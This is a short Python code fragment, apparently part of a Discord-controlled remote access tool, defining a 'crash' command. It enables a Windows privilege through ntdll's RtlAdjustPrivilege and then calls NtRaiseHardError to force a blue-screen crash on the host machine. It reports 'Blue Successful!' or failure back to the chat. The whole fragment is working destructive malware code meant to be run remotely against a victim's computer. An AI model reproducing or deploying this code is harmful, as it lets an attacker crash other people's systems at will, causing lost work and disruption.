


async def crash():
    await message.reply("Attempting...", delete_after = .1)
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        await message.reply("Blue Successful!")
    else:
        await message.reply("Blue Failed! :(")